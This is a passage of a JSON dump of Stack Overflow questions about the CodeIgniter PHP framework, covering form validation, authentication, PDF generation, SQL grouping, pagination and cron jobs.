Preferably would like to find an example ajax long polling with mysql and codeigniter.</p>\n\n<p>Anyone comes across this question and has a good example please let me know.</p>\n\n<p>Anyone who reads this that thinks they know the ajax long polling I'm looking for please email me or let me know on here.\nI have chat app almost done utilizing Codeigniter but I am having trouble with jquery/ajax long polling part that is client side. \nI have not posted this chat app because last time I posted another chat app I have another developer on here complained there was too much code I posted. I am ready to send this code to anyone who can actually provide ajax long polling code that works.</p>\n\n<p>Thanks so much.</p>\n"},{"tags":["validation","forms","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2353,"score":1,"question_id":6130060,"title":"codeigniter form validation","body":"<p>I have the following php code using the codeigniter framework</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('money', 'Money', 'integer|required|xss_clean');\n</code></pre>\n\n<p>It validates a money field as an integer. How can i validate the field as an integer OR a decimal number.</p>\n\n<p>I guessed it would be something simple like</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('money', 'Money', '(decimal||integer)|required|xss_clean');\n</code></pre>\n\n<p>but it doesnt work!</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12018250,"title":"Login automatically after registration using tank_auth for codeigniter","body":"<p>After reading a lot of answers here on what is the best authentication out there for codeigniter, I decided to use <a href=\"http://konyukhov.com/soft/tank_auth/\" rel=\"nofollow\">tank_auth</a>.</p>\n\n<p>It seems to be the best authentication for codeigniter.</p>\n\n<p>However, I have some few questions regarding on how I can integrate it successfully on my site. I am currently building a hotel reservation system. So some functionality of tank_auth needs to be modified to suit my needs.</p>\n\n<p>So how can I, after registration, login the user automatically without requiring him/her to activate his/her account. Is there a configuration to disable the \"activation process\". If yes, where can I find it? If no, is it a big modification to the code if I remove the activation process?</p>\n\n<p>On the auth.php code I tried to comment the following code to remove the activation process but seems it does not work:</p>\n\n<pre><code>} elseif ($this-&gt;tank_auth-&gt;is_logged_in(FALSE)) { // logged in, not activated\nredirect('/auth/send_again/');\n</code></pre>\n"},{"tags":["php","codeigniter","usercontrols","oauth"],"answer_count":2,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":5164012,"title":"How should I manage users who loggged in through OAuth?","body":"<p>Consider I have a user table which gets user data.\nI have 2 cases where people can register for my site.</p>\n\n<p>case 1. \nPeople just type every information needed to register my site. (old classic way)</p>\n\n<p>case 2.\nI set up OAuth where people can use Twitter or other Authentication system (providing OAuth API) to log on to my site. So, these users won't actually type in their </p>\n\n<p>In what way should I store users who login through case 2 in my site? \nDo I just store their information ( that I would fetch using OAuth API) as their user ID, and tokens as their password?\nOr do I have to make them register once again with provided information?</p>\n\n<p>What would be the best way to manage case 1 and case 2? Can someone tell me their own experience with this? </p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12958356,"title":"Codeigniter shorten urls","body":"<p>Is it possible to create such urls in codeigniter?\n<a href=\"http://site.com/shorturl/\" rel=\"nofollow\">http://site.com/shorturl/</a></p>\n\n<p>Where shorturl isn't a physical controller file, but a variable.</p>\n\n<p>I expect the algorythm for parsing url query to be like this:\n1) Search for physical controller file. If exists, do standard codeigniter routine. If not\n2) Try to load special controller file, where \"shorturl\" is a variable. Do further stuff inside that controller.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php","pdf","codeigniter","dompdf"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3331,"score":1,"question_id":5035112,"title":"Generating a PDF using CodeIgniter","body":"<p>I am using <a href=\"http://www.dompdf.com\" rel=\"nofollow\">dompdf</a> to create a pdf file out of an html file that gets created on-the-fly for the sole purpose of it serving as input for the pdf generator, however I am having trouble doing this, I implemented the code in <a href=\"http://codeigniter.com/wiki/PDF_generation_using_dompdf/\" rel=\"nofollow\">this thread</a> and everything works fine (I could output a simple pdf) however when I try to give it a more specific url I get this error:</p>\n\n<blockquote>\n  <p>An Error Was Encountered Unable to\n  load the requested file</p>\n</blockquote>\n\n<p>here's the code that has the problem:</p>\n\n<pre><code>function printPDF(){\n\n            //write_file() usa un helper (file)\n            $this-&gt;load-&gt;library('table');\n            $this-&gt;load-&gt;plugin('to_pdf');\n             // page info here, db calls, etc.\n             $query = $this-&gt;db-&gt;get('producto');\n             $data['table'] = $this-&gt;table-&gt;generate($query);\n             $path_url = base_url().'print/existencias.html';\n             write_file($path_url, $data['table']);\n             $html = $this-&gt;load-&gt;view($path_url, 'consulta', true);\n             pdf_create($html, 'consulta');\n        }\n</code></pre>\n"},{"tags":["codeigniter","facebook-php-sdk"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12956848,"title":"Long-lived access_token and PHP SDK","body":"<p>I have a problem using Facebook PHP SDK function setExtendedAccessToken and CodeIgniter framework. When I try to call it before loading a view, it works and extends access token but page keeps reloading forever.</p>\n\n<p>Code:</p>\n\n<pre><code>public function access() {\n   $this-&gt;facebook-&gt;setExtendedAccessToken();\n   $data['manage_pages']=$this-&gt;Fb_model-&gt;get_pages(); // it contains a call to graph api to get facebook pages list with id, name, access_token\n\n   $data['main_content']='list';\n   $this-&gt;load-&gt;view('template/main', $data); // get_header, load-&gt;view($data['main_content']), get_footer\n}\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["codeigniter","calendar"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":148,"score":1,"question_id":10282173,"title":"CodeIgniter Calendaring Class Remove Weekends","body":"<p>I had used CodeIgniter for a lot of my projects and I decided to use the Calendaring Class over Jquery Calendar to display monthly bookings. I have set it up and displaying data FINE. </p>\n\n<p>It's the fact that I don't need the weekends, there taking up precious room on my webpage. I have researched online and some people explain that you can use the template in the $prefs array.</p>\n\n<p>I think its something to do with the Template Parser Class but I just can't get my head around it.</p>\n\n<p>If any can give me link, help or examples it would be greatly appreciated.   </p>\n"},{"tags":["mysql","sql","codeigniter","group-by"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":12955755,"title":"codeigniter count / with group by","body":"<p>I have a Table <code>ANKETADATA</code> in my database which containts a column <code>PROVO</code>. I want to have output like this:</p>\n\n<p><code>povremeno : 15</code>. (The number show how many times found this row in column PRVO)\n<code>nikad : 40</code>.</p>\n\n<p>MODEL:</p>\n\n<pre><code>$anketadb = $this-&gt;load-&gt;database('anketa',TRUE);\n\n    $anketadb-&gt;select('prvo');\n    $anketadb-&gt;from('anketadata');\n    $anketadb-&gt;group_by('prvo');\n$result =   $anketadb-&gt;get();\n\n$result =   $result-&gt;result_array();\n\n$count  =   array('povremeno' =&gt; 0, 'nikad' =&gt; 0, 'svakibroj' =&gt; 0, 'prodajemkupujem' =&gt; 0);\n\nforeach($result as $row){\n    switch($row){\n        case 'povremeno' :  $count['povremeno']++; break;\n        case 'nikad' : $count['nikad']++; break;\n        case 'svakibroj' :  $count['svakibroj']++; break;\n        case 'prodajemkupujem' : $count['prodajemkupujem']++; break;\n    }\n}\nreturn $count;\n</code></pre>\n\n<p>CONTROLLER:</p>\n\n<pre><code>$this-&gt;load-&gt;model('anketerezultati_model');\n    $data['count'] = $this-&gt;anketerezultati_model-&gt;prvo();\n    $this-&gt;load-&gt;view('ankete/rezultatiankete', $data);\n</code></pre>\n\n<p>VIEW:</p>\n\n<pre><code>echo \"povremeno\".$count['povremeno'];\necho \"nikad\".$count['nikad'];\n</code></pre>\n\n<p>The result is 0 for both. I cannot find the mistake.</p>\n"},{"tags":["sql","codeigniter","activerecord"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":55,"score":-3,"question_id":12953376,"title":"How to convert this sql code to Codigniter ActiveRecord","body":"<p>I have a row in table PRVO with four type of values : first, second, third, fourth</p>\n\n<p>I want to count how many occurrences of first and how many of second and how many of third and how many of fourth I have and echo it like this:</p>\n\n<pre><code>First = 4\nSecond = 5\n.....\n</code></pre>\n\n<p>I have the following code:</p>\n\n<pre><code>$anketadb-&gt;select('prvo');\n$anketadb-&gt;from('anketadata');\n$anketadb-&gt;group_by('prvo');\n</code></pre>\n\n<p>How can I add the count to have the result like I wrote above?\nThanks in advance</p>\n\n<p>UPDATE:</p>\n\n<p>Now I have situation:\nMODEL:</p>\n\n<pre><code>$anketadb = $this-&gt;load-&gt;database('anketa',TRUE);\n\n    $anketadb-&gt;select('prvo');\n    $anketadb-&gt;from('anketadata');\n    $anketadb-&gt;group_by('prvo');\n$result =   $anketadb-&gt;get();\n\n$result =   $result-&gt;result_array();\n\n$count  =   array('povremeno' =&gt; 0, 'nikad' =&gt; 0, 'svakibroj' =&gt; 0, 'prodajemkupujem' =&gt; 0);\n\nforeach($result as $row){\n    switch($row){\n        case 'povremeno' :  $count['povremeno']++; break;\n        case 'nikad' : $count['nikad']++; break;\n        case 'svakibroj' :  $count['svakibroj']++; break;\n        case 'prodajemkupujem' : $count['prodajemkupujem']++; break;\n    }\n}\nreturn $count;\n</code></pre>\n\n<p>CONTROLLER:</p>\n\n<pre><code>$this-&gt;load-&gt;model('anketerezultati_model');\n    $data['count'] = $this-&gt;anketerezultati_model-&gt;prvo();\n    $this-&gt;load-&gt;view('ankete/rezultatiankete', $data);\n</code></pre>\n\n<p>VIEW:</p>\n\n<pre><code>echo \"povremeno\".$count['povremeno'];\necho \"nikad\".$count['nikad'];\n</code></pre>\n\n<p>And result is 0 for both... I cannot find the mistake.</p>\n"},{"tags":["codeigniter","web","web-hosting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12954635,"title":"why my Codeigniter base_url () config doesnt work on web hosting?","body":"<p>I've just uploaded my Ci code to web hosting 1and1.co.uk and the base_url() which is in config.php not work at all , it keep goes to localhost/blabala instead www.example.com/</p>\n\n<p>anyone know why this is happened? did I miss something??</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12954300,"title":"codeigniter with sql","body":"<pre><code>public function display( $date )\n        {\n            $this-&gt;db-&gt;select('*');         \n            $this-&gt;db-&gt;from('event');\n                 $this-&gt;db-&gt;where('start_date','$date');\n                     $res = $this-&gt;db-&gt;get()-&gt;result_array();           \n                 return $res;   \n        }\n     }\n</code></pre>\n\n<p>i am using this code in codeigniter to fetch the data from my database.but i get the error as \"Conversion failed when converting date and/or time from character string in sql\".anyone pls help.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":42,"score":2,"question_id":12954108,"title":"Call to undefined function result()","body":"<p>I am getting this error in my view file. Here is my code please do help me out and tell what to do?</p>\n\n<pre><code>&lt;?php \n//foreach($records-&gt;result() as $row):\nforeach(result() as $row):\n echo $row-&gt;title;\nendforeach;\n?&gt;\n</code></pre>\n\n<p>Here is my controller file:</p>\n\n<pre><code>    &lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Hello extends CI_Controller\n{\n    public function index()\n    {\n        $this-&gt;load-&gt;model('hello_model');\n        $data['records']=$this-&gt;hello_model-&gt;getAll();\n        $this-&gt;load-&gt;view('you_view',$data);\n        //$this-&gt;load-&gt;view('you_view');\n    }\n}\n?&gt;\n</code></pre>\n\n<p>I am posting here my model file also. Ihv tried some by me, but still getiing this error. Dnt knw wt to do.</p>\n\n<pre><code>&lt;?php\n\nclass Hello_model extends CI_Model\n{\n    function __construct()\n    {\n        // Call the Model constructor\n        parent::__construct();\n    }\n\n    function getAll()\n    {\n    $q=$this-&gt;db-&gt;get('test'); // query where 'test' is table name.\n\n        if($q-&gt;num_rows()&gt;0)\n        {\n           foreach ($q-&gt;result() as $row)\n           {\n              $data[]=$row;\n           }\n        return $data;\n        }\n    }\n}\n?&gt;\n</code></pre>\n"},{"tags":["codeigniter","e-commerce","pyrocms"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":526,"score":0,"question_id":10990773,"title":"Is there a eCommerce plugin for Pyro CMS?","body":"<p><em>Im starting to use PyroCMS and Codeignigter more often;\nI find it a very powerfull little CMS. However I cant find any eCommerce plugins/Shopping cart features around.</em> </p>\n\n<p><strong>Question</strong>\nDoes anyone know if there is a Shopping Cart plugin available for PyroCMS, or do I have to write my own?</p>\n\n<p><strong>EXTRA:</strong>\nIf I have to write my own, is there a good light PHP opensource cart that can be converted into a Pyro Addon?</p>\n"},{"tags":["jquery","json","codeigniter","e-commerce"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12945801,"title":"Using Jquery Ajax function for Ecommerce Category Layout? HOW?","body":"<p>I am building a custom ecommerce site for a client of mine and I've decided that I want to use Ajax to repopulate the product layout when they choose an option. So for instance...</p>\n\n<p>I have a list of colors. Red, blue, green, etc. When they click one of the colors I want to pass the ID of the color to the ajax function. It will go to a php function where it pulls a new list of products based on the color they chose. It returns a JSON object with all the products in it. THIS PART I CAN HANDLE.</p>\n\n<p>So this is the part I need help on. I have never done this before so i'm wondering, how will I layout out my product table after the JSON object is returned? Obviously I can't pass the JSON object back to php and do it that way so would i just recreate my product table with jquery writing a foreach loop for the JSON object and then replacing my container div with that content?</p>\n\n<p>How would you normally and professionally go about doing that?</p>\n\n<p>RESPONSE TO COMMENTS:</p>\n\n<p>well I've written the template in PHP on the initial page load. I am using ajax so I don't have to reload the page. </p>\n\n<p>Here is my PHP</p>\n\n<pre><code>&lt;?php foreach($products as $p): ?&gt;\n        &lt;div class=\"indProduct\"&gt;\n            &lt;?php foreach($images as $img): ?&gt;\n            &lt;?php if($img['productId'] == $p['id']): ?&gt;\n            &lt;div class=\"prodImg\"&gt;&lt;img src=\"&lt;?php echo base_url(); ?&gt;images/products/&lt;?php echo $img['image']; ?&gt;\" alt=\"&lt;?php echo $p['productTitle']; ?&gt;\" /&gt;&lt;/div&gt;\n            &lt;?php endif; ?&gt;\n            &lt;?php endforeach; ?&gt;\n            &lt;?php if($p['salePrice'] != 0.00): ?&gt;\n            &lt;div class=\"prodSaleBanner\"&gt;&lt;/div&gt;\n            &lt;?php endif; ?&gt;\n            &lt;div class=\"prodTitle\"&gt;&lt;?php echo $p['productTitle']; ?&gt;&lt;/div&gt;\n            &lt;div class=\"prodPrice\"&gt;\n                &lt;?php if($p['salePrice'] != 0.00): ?&gt;\n                $&lt;?php echo number_format($p['salePrice'], 2, '.', ''); ?&gt;\n                &lt;?php else: ?&gt;\n                $&lt;?php echo number_format($p['price'], 2, '.', ''); ?&gt;\n                &lt;?php endif; ?&gt;\n                &lt;br /&gt;\n                &lt;div class=\"original-price\"&gt;\n                    &lt;?php if($p['salePrice'] != 0.00): ?&gt;\n                    $&lt;span style=\"text-decoration:line-through;\"&gt;&lt;?php echo number_format($p['price'], 2, '.', ''); ?&gt;&lt;/span&gt; \n                    &lt;span class=\"savings\"&gt;\n                        &lt;?php \n                        $savings = $p['price'] - $p['salePrice'];\n                        echo 'SAVE: '.number_format($savings, 2, '.', '');\n                        ?&gt;\n                    &lt;/span&gt;\n                    &lt;?php endif; ?&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n            &lt;div class=\"prodAddButton\"&gt;\n                &lt;a href=\"&lt;?php echo $p['id']; ?&gt;\" id=\"addToCartButton\" class=\"storeButton\"&gt;Add To Cart&lt;/a&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n        &lt;?php endforeach; ?&gt;\n</code></pre>\n\n<p>So my plan was to get the JSON object then basically redo all the above code in the ajax success request using jquery and json instead of PHP. Is this a hard way of doing it?</p>\n"},{"tags":["jquery","codeigniter","jquery-plugins","document.ready"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12952832,"title":"CodeIgniter won't allow jQuery plugins to work","body":"<p>This is a very weird one. CodeIgniter won't allow the jQuery plugins I have to work. Custom functions work fine though.</p>\n\n<p>Structure of my CI: I have a MY_controller method that creates a header_view to be used with every page. The MY_Controller has other methods too. </p>\n\n<p>The other controllers extend this, so they load the header_view. The header_view has all the links to the .js files. I know they are linked correctly as if I view source and click the links to the files, the code shows. The header_view has files linked in this order: jquery, jquery_plugin, custom. </p>\n\n<p>When I try to call ANY function from ANY plugin all I get is an error saying that function does not exist, however when I create a function in custom it works just fine. </p>\n\n<p>The code calling the functions are placed in a <code>document.ready</code>, but when I remove the <code>document.ready</code> and put the function call at the bottom of the page, it works also, except that plugins requiring other plugins don't work. </p>\n\n<p>This is incredibly frustrating, and I hope I have explained enough. Any help at all would be much appreciated as I have been trying to sort this for hours. =[</p>\n\n<p>EDIT: <a href=\"http://jsfiddle.net/ngs6V/1/\" rel=\"nofollow\">http://jsfiddle.net/ngs6V/1/</a> the rendered html works fine on jsfiddle, though won't work for you as it's using localhost files</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":515,"score":1,"question_id":9322670,"title":"CodeIgniter GROUP_CONCAT and join","body":"<p>I am trying to figure a way to join these two tables together, which I was able to do, but if it found more than one value that matched, it showed everything from the product table again. Now I am trying to use the MySQL group_concat together to be able to list all of tName in one field in the array but I keep getting an error with MySQL:</p>\n\n<blockquote>\n  <p>Error Number: 1064</p>\n  \n  <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'FROM (<code>sp_product</code>) LEFT OUTER JOIN <code>sp_product_type</code> ON <code>sp_product_type</code>.`tCat' at line 2</p>\n  \n  <p>SELECT <code>sp_product</code>.<code>name</code>, <code>sp_product</code>.<code>price</code>, <code>sp_product</code>.<code>perm_name</code>, <code>sp_product</code>.<code>description</code>, GROUP_CONCAT(product_type.tName SEPARATOR FROM (<code>sp_product</code>) LEFT OUTER JOIN <code>sp_product_type</code> ON <code>sp_product_type</code>.<code>tCategory</code> = <code>sp_product</code>.<code>type</code> WHERE <code>perm_name</code> = 'bacon'</p>\n</blockquote>\n\n<pre><code>$this-&gt;db-&gt;select('product.name, product.price, product.perm_name, product.description, GROUP_CONCAT(product_type.tName SEPARATOR ',') as product_type.tName'); \n$this-&gt;db-&gt;from('product');\n$this-&gt;db-&gt;where('perm_name', $this-&gt;uri-&gt;segment(2));\n$this-&gt;db-&gt;join('product_type', 'product_type.tCategory = product.type', 'LEFT OUTER');\n$query = $this-&gt;db-&gt;get(); \n</code></pre>\n\n<p>Any ideas what I am doing wrong?</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12953339,"title":"error are not logged but debug messages are logged","body":"<p>i am using <strong>codeignitor v.3.0-dev</strong>. </p>\n\n<p>In my <code>application\\config\\config.php</code> the following line</p>\n\n<pre><code>`$config['log_threshold'] = 1;` errors are not logging even if I place some wrong syntax's errors...\n</code></pre>\n\n<p>If I try</p>\n\n<p><code>$config['log_threshold'] = 2 or  3 or 4</code>  the messages are logged....</p>\n\n<p>Can some one tell me why is this happening.... </p>\n\n<p>Thanks in advance...</p>\n"}]}
{"total":13987,"page":8,"pagesize":100,"questions":[{"tags":["codeigniter","dompdf"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":155,"score":0,"question_id":12776668,"title":"Adding Header and Footer with page number in dompdf","body":"<p>Hi i am working on codeigniter framwork and i successfully implemented dompdf for generating pdf files . now i have a issues on adding Header and footer in generated pdf \nso please help me to solve this issue </p>\n\n<p>here is the my dompdf_helper code\n    \n\n<pre><code>$dompdf = new DOMPDF();\n$dompdf-&gt;load_html($html);\n$dompdf-&gt;render();\n  $dompdf-&gt;set_paper(\"A4\");\nif ($stream) {\n    $dompdf-&gt;stream($filename.\".pdf\",1);\n} else {\n    return $dompdf-&gt;output();\n}\n}\n</code></pre>\n\n<p>?>\nhere is the my controller to call pdf generation\n    \n\n<pre><code>$data['store']=$res;  \n$this-&gt;load-&gt;helper(array('dompdf', 'file'));\n$html = $this-&gt;load-&gt;view('store/sales_pdf', $data, true);\n$html.= $this-&gt;load-&gt;view('footer');\n$filename=\"salesbill\".$id;\npdf_create($html, $filename);\n$data = pdf_create($html, '', false);\nwrite_file('name', $data); \n?&gt;\n</code></pre>\n\n<p>and i use the script for getting page no but it printed only if second page is exits otherwise wont print\n      </p>\n\n<pre><code>    if ( isset($pdf) ) {\n\n      $font = Font_Metrics::get_font(\"helvetica\", \"bold\");\n      $pdf-&gt;page_text(500,10, \"Page: {PAGE_NUM} of {PAGE_COUNT}\", $font, 6, array(0,0,0));\n\n    }\n    &lt;/script&gt;\n</code></pre>\n\n<p>i want to print the company name and contact details and bill no as header in everypage then in a footer i want to add a page number like 1 0f 3\nit is very urgent work so plz help me</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2702,"score":1,"question_id":7475494,"title":"Getting the id of last inserted record","body":"<p>I'm trying to get the id of last inserted record in the Db. But i'm getting the error</p>\n\n<pre><code>      Parse error: syntax error, unexpected T_RETURN in Z:\\www\\CI4\\application\\models           \\report_model.php on line 69\n</code></pre>\n\n<p>my model:</p>\n\n<pre><code>       function getLastInserted() {\n$query =\"SELECT $id as maxID from info where $id = LAST_INSERT_ID()\"\n\nreturn $query; //line 69\n       }\n</code></pre>\n\n<p>my controller:</p>\n\n<pre><code>            function index()\n    {           \n\n    $id=$this-&gt;report_model-&gt;getLastInserted();\n    $this-&gt;load-&gt;view('u_type1',$id);\n    }\n</code></pre>\n"},{"tags":["php","file","codeigniter","pyrocms","image-upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12313902,"title":"File Name error in Codeigniter Upload Library","body":"<p>I am having multiple fields of file upload. In the start there is no field when a user clicks on add button it displays a file upload field</p>\n\n<p>In View</p>\n\n<pre><code>PHP    \n&lt;?php echo $i = 0;?&gt;\n\nJavascript\nvar i = '&lt;?php echo $i?&gt;';  \n\n&lt;input type=\"file\" name=\"product_image_' + i +'\"/&gt;\n</code></pre>\n\n<p>When i submit the form if displays this output</p>\n\n<pre><code>Array\n(\n    [product_image_1_] =&gt; Array\n        (\n            [name] =&gt; 25412_D80_backsanspic.png\n            [type] =&gt; image/png\n            [tmp_name] =&gt; C:\\xampp\\tmp\\php68.tmp\n            [error] =&gt; 0\n            [size] =&gt; 355623\n        )\n\n    [product_image_2_] =&gt; Array\n        (\n            [name] =&gt; 25420_D40_right.png\n            [type] =&gt; image/png\n            [tmp_name] =&gt; C:\\xampp\\tmp\\php69.tmp\n            [error] =&gt; 0\n            [size] =&gt; 347694\n        )\n\n    [product_image_3_] =&gt; Array\n        (\n            [name] =&gt; 26135_P6000_34r.png\n            [type] =&gt; image/png\n            [tmp_name] =&gt; C:\\xampp\\tmp\\php6A.tmp\n            [error] =&gt; 0\n            [size] =&gt; 420441\n        )\n\n    [product_image_4_] =&gt; Array\n        (\n            [name] =&gt; \n            [type] =&gt; \n            [tmp_name] =&gt; \n            [error] =&gt; 4\n            [size] =&gt; 0\n        )\n\n)\n</code></pre>\n\n<p>You can see there is underscore in each file upload field. I dont understand how this is possible. Also if i do this</p>\n\n<pre><code>echo $_FILES['product_image_4_']['error'];\n</code></pre>\n\n<p>It displays output but this does not</p>\n\n<pre><code>echo $_FILES['product_image_4']['error'];\n</code></pre>\n\n<p>Instead it produces error undefined index product_image_4\nAny suggestion. I am using pyrocms built on codeigniter.</p>\n"},{"tags":["php","codeigniter","pagination","limit","offset"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12946599,"title":"pagination CI merge table","body":"<p>I need help on CI pagination on joint-table.</p>\n\n<p>The following code is not working. All information show in single page but the link ( $this->pagination->create_links(); ) show correct amount of page that it should have with correct paging. Any time I click the next page or to other page it show the same result. Any suggestion to make this work successfully. Thank you.</p>\n\n<pre><code>public function last_three_months(){\n$this-&gt;load-&gt;model('mymodel');\n$this-&gt;load-&gt;database();\n$this-&gt;load-&gt;library('btree');\n$this-&gt;load-&gt;library('session');\n$this-&gt;load-&gt;library('string');\n$this-&gt;load-&gt;library(\"Pagination\");\n\n\n\n    if(date(\"l\",strtotime('now')) == \"Monday\")\n        $isMonday = strtotime('now');\n    else\n        $isMonday = strtotime('last Monday');\n    $min = $isMonday - 7257600; // 7257600 = 12 weeks\n    $max = strtotime('now');\n    //echo(date(\"l d M Y\",$duration));  \n\n    $result = $this-&gt;mymodel-&gt;query('SELECT DISTINCT pi.ID PLAN_ID, pi.IMP_PLAN_DATE DUE_DATE, pi.CHANGE_TICKET CHANGE_TICKET, \n    pi.PLAN_DESC PLAN_DESC, pi.EC_STAT EC_STAT, per_info.ID PERSON_ID, per_info.FIRSTNAME OWNER_FIRST,per_info.LASTNAME OWNER_LAST,ps.STATUS PLAN_STAT, \n    pi.TIMESTAMP TIMESTAMP, sn.SN SN, loc.ABBR ABBR, sf.SF SF, pn.ID pn_id, pn.TYPE pn_type, pn.CODE pn_code, pn.YEAR pn_year, pn.NAME pn_name, si.IMP_STAT IMP_STAT\n    FROM `Plan_Info` pi, `Member` member,`Person_Info` per_info,`Plan_Stat` ps,`Sn_Imp` si,`System_Name` sn,\n    `Location` loc, System_Family sf, PN pn\n    WHERE member.MEM_TYPE = \"Implementer\"  AND pi.OWNER = member.PERSON_ID AND member.PERSON_ID = per_info.ID AND pi.PLAN_STAT = ps.ID AND pi.ID = si.PLAN_ID AND si.SN_ID = sn.ID AND sn.LOC_ID = loc.ID AND sn.SF_ID = sf.ID \n    AND pi.PN_ID = pn.ID  AND  pi.IMP_PLAN_DATE &gt;= '.$min. ' AND pi.IMP_PLAN_DATE &lt; '.$max.' ORDER BY pi.IMP_PLAN_DATE, loc.ABBR, sf.SF')-&gt;result_array();      \n\n    $plan_info = $this-&gt;btree-&gt;convertToBtree($result, array('PLAN_ID','DUE_DATE','CHANGE_TICKET','PLAN_DESC','EC_STAT','PERSON_ID','OWNER_FIRST',  \n    'OWNER_LAST','PLAN_STAT','TIMESTAMP','SN','ABBR','SF','pn_id','pn_type','pn_code','pn_year','pn_name','IMP_STAT'), array('PLAN_ID','pn_id','DUE_DATE','ABBR'));\n\n    $total = count($plan_info);\n\n    $config = array();\n    $config[\"base_url\"] = base_url() . 'index.php/implementer/last_three_months/';\n    $config[\"total_rows\"] = $total;\n    $config[\"per_page\"] = 3;\n    $config[\"uri_segment\"] = 3;\n    $config['first_link'] = 'First';\n    $config['last_link'] = 'Last';\n    $config['next_link'] = 'next';\n    $config['prev_link'] = 'prev';\n    //$config['use_page_numbers'] = TRUE;\n    $this-&gt;pagination-&gt;initialize($config);         \n\n\n\n\n    $link = $this-&gt;pagination-&gt;create_links();\n    $content_data = array(\n        'plan_info' =&gt; $plan_info,\n        'link' =&gt; $link\n\n    );\n\n    $this-&gt;load-&gt;view('implementer/view_weekly/header');\n    $this-&gt;load-&gt;view('logo');\n    $this-&gt;load-&gt;view('nev');\n    $this-&gt;load-&gt;view('implementer/view_weekly/content',$content_data);\n    $this-&gt;load-&gt;view('implementer/view_weekly/footer');\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter","cron","cpanel"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":602,"score":2,"question_id":10322587,"title":"CodeIgniter + Command Line + Cron + Cpanel","body":"<p>SOLVED:\nCrap... why is it always you figure something out right AFTER you finally decided to ask for help!! </p>\n\n<p>If anyone else is having this problem, try running from /usr/local/bin/php instead of /usr/bin/php to get codeigniter to pick up on the URI segments.</p>\n\n<p>QUESTION</p>\n\n<p>I have the latest installation of codeigniter and everything seems to be working fine locally.  I recently put my files on my server and everything except my cron command is working.</p>\n\n<p>When I try to call a controller through cron (as described here: <a href=\"http://codeigniter.com/user_guide/general/cli.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/general/cli.html</a>), I am not getting the controller.  Instead, the output I get is simply my default controller (login page).</p>\n\n<p>This worked fine locally and the index.php IS getting called because I'm getting emailed the output from the default page.  </p>\n\n<p>Someone asked a similar question here: <a href=\"http://stackoverflow.com/questions/8332278/codeigniter-cron-job-on-shared-hosting\">CodeIgniter Cron Job on Shared Hosting?</a>  Responders suggested that it was a problem with Cpanel (which is what i'm now trying to use to set up the cron job), but talking to my hosting provider, they said the whole command is being run.  Nevertheless, CI isn't grabbing the URI for the controller.   I also checked to make sure the base_url is set correctly (which is proven by the file working fine through a URL call).</p>\n\n<p>Any thoughts? I just can't seem to figure out why it's not grabbing the URI when in command line format: /usr/bin/php index.php controller_class method</p>\n"},{"tags":["php","codeigniter","templates"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":90,"score":-1,"question_id":12871320,"title":"codeigniter phil sturgeon template , how to pass variable to partial view with set_partial() method","body":"<p>I am using phil sturgeon's codeigniter template engine but i have problem how to pass variable to partial view with <strong>set_partial()</strong> method. <br />\nI used : <br /></p>\n\n<pre><code>$this-&gt;template-&gt;set_partial('name_partial','path/to/partial',$_data_to_pass);\n</code></pre>\n\n<p>but when in view I use <code>var_dump($data_to_pass)</code> the variable seem does not exist.<br />\nI read in the documentation that it is possible to pass extra data only to partial with that function.</p>\n"},{"tags":["php","codeigniter","session","libraries"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12902804,"title":"in codeigniter, how can i use both system and application libraries within libraries?","body":"<p>Basically in codeigniter, how can i use the system and application libraries within other libraries?  So say 